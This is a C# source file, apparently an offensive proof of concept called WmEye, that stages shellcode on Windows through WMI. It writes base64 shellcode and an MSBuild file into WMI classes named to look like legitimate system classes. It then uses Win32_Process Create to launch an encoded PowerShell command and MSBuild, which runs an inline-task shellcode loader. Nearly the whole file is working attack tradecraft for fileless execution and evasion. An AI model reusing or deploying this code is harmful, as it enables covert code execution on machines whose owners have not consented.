/*
 * - Create a Remote WMI Class
 * - Write Shellcode as property value to the Class
 * - Write MSBuild File Content as value to another Class
 * - Win32_Process Create to call powershell -> Reads property and dumps content to BuildConfig.xml
 * - Win32_Process Create to call MSbuild remotely -> XML file is Inline task with Shellcoder loader, fetches shellcode from first class property
 * 
 *  [Author - Pwnisher]
 *  Note: Its just a POC, Not at all safe for real engagements!
 */


using System;
using System.Collections;
using System.Collections.Generic;
using System.Management;
using System.Windows.Forms;
using System.Text;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;


namespace WmEye
{
    public class WmEye
    {

        public static void Main()
        {

            // Handle CLI Args 

            UploadShellcode();
            UploadBuildFile();
            ExecuteStageOne();
            ExecuteStageTwo();
          
            // Scope Cleanup Method

        }


        private static string ShellCodeUploadTempWMIClassName = "Win32_OSRecoveryConfigurationData";
        private static string ShellCodeUploadTempWMIPropertyName = "Description";

        private static string FileUploadTempWMIClassName = "Win32_OSRecoveryConfigurationFiles";
        private static string FileUploadTempWMIPropertyName = "Description";

        private static string writePath = "Z:\\temp\\BuildConfig.xml";

        private static string InitiateConnection(ref ManagementScope scope, string host, string user, string password, string wmiNamespace)
        {
            ConnectionOptions options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
                EnablePrivileges = true,
            };

            if (!String.IsNullOrEmpty(user) && !String.IsNullOrEmpty(password))
            {
                options.Username = user;
                options.Password = password;
            }

            if (String.IsNullOrEmpty(wmiNamespace))
            {
                wmiNamespace = "root\\cimv2";
            }

            string fullNamespace;
            if (!String.IsNullOrEmpty(host))
            {
                fullNamespace = String.Format(@"\\{0}\{1}", host, wmiNamespace);
            }
            else
            {
                fullNamespace = String.Format(@"\\.\{0}", wmiNamespace);
            }

            try
            {
                scope = new ManagementScope(fullNamespace, options);
                scope.Connect();
            }
            catch (UnauthorizedAccessException)
            {
                return String.Format("Username: {0} with Password {1} threw an unauthorised exception\n", user, password);
            }
            catch (Exception e)
            {
                return String.Format("[!] WMI connection failed: {0}", e.Message);
            }


            return "";
        }



        public static void UploadShellcode()
        {


            string className = ShellCodeUploadTempWMIClassName;
            string evilPropertyName = ShellCodeUploadTempWMIPropertyName;

            // MessageBox ShellCode

            string fileData = @"MdKyMGSLEotSDItSHItCCItyIIsSgH4MM3XyiccDeDyLV3gBwot6IAHHMe2LNK8BxkWBPkZhdGF18oF+CEV4aXR16Yt6JAHHZossb4t6HAHHi3yv/AHHaHl0ZQFoa2VuQmggQnJvieH+SQsxwFFQ/9c=";


            var scope = new ManagementScope();
            string r = InitiateConnection(ref scope, "", "", "", "");

            // We're creating a static WMI class here
            ManagementObject evilClass = new ManagementClass(scope, null, null);
            evilClass["__CLASS"] = className;
            evilClass.Properties.Add(evilPropertyName, CimType.String, false);
            evilClass.Properties[evilPropertyName].Value = fileData.ToString();

            try
            {
                Console.WriteLine("[X] Uploading Shellcode as Evil Property. : {0}", evilPropertyName);
                evilClass.Put();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception during setting the evil property : {0}", ex.Message);
                return;
            }


            Console.WriteLine("[X] ShellCode Property Created");
        }




        public static void UploadBuildFile()
        {

            // Write MSBuild XML File to Target

            string uploadFile = "Z:\\BuildConfig.xml";
         
           

            if (!File.Exists(uploadFile))
            {
                Console.WriteLine("[-] Specified local file does not exist, not running PS runspace\n");

            }


            // Console.WriteLine(originalWMIProperty);


            string className = FileUploadTempWMIClassName;
            string evilPropertyName = FileUploadTempWMIPropertyName;


            var scope = new ManagementScope();
            string r = InitiateConnection(ref scope, "", "", "", "");

            // We're creating a static WMI class here
            ManagementObject evilClass = new ManagementClass(scope, null, null);
            evilClass["__CLASS"] = className;
            evilClass.Properties.Add(evilPropertyName, CimType.String, false);


            // Add compression later
            byte[] uploadFileBytes = File.ReadAllBytes(uploadFile);


            string originalWMIProperty = Convert.ToBase64String(uploadFileBytes);

            evilClass.Properties[evilPropertyName].Value = originalWMIProperty.ToString();

            evilClass.Put();

            Console.WriteLine("[X] Build XML File Written to Property");

            // Wait to finish file upload
           Thread.Sleep(1000);


        } 


        public static void ExecuteStageOne()
        {


            string command = "$e=([WmiClass]'root\\cimv2:Win32_OSRecoveryConfigurationFiles').Properties['Description'].Value; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e)) | Out-File -FilePath " + writePath;

            var scope = new ManagementScope();
            string r = InitiateConnection(ref scope, "", "", "", "");

            var encodedCommandB64 =
                   Convert.ToBase64String(Encoding.Unicode.GetBytes(command));


            // Create Method from win32_process for powershell command

            ObjectGetOptions optionons2 = new ObjectGetOptions();
            ManagementPath pather = new ManagementPath("Win32_Process");
            ManagementClass classInstance = new ManagementClass(scope, pather, optionons2);
            ManagementBaseObject inParams = classInstance.GetMethodParameters("Create");

            inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;

            ManagementBaseObject outParams = classInstance.InvokeMethod("Create", inParams, null);

            Console.WriteLine("[X] Config File Written");


        } // closing Stageone

        public static void ExecuteStageTwo()
        {


            var scope = new ManagementScope();
            string r = InitiateConnection(ref scope, "", "", "", "");

            ObjectGetOptions optionons3 = new ObjectGetOptions();
            ManagementPath pather2 = new ManagementPath("Win32_Process");
            ManagementClass classInstance2 = new ManagementClass(scope, pather2, optionons3);
            ManagementBaseObject inParams2 = classInstance2.GetMethodParameters("Create");

            string Command = "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\Msbuild.exe " + writePath;

            inParams2["CommandLine"] = Command;
            Console.WriteLine("[X] Invoking : {0}", Command);

            ManagementBaseObject outParams2 = classInstance2.InvokeMethod("Create", inParams2, null);


        } // Closing StageTwo



    } // class

} //namespace 

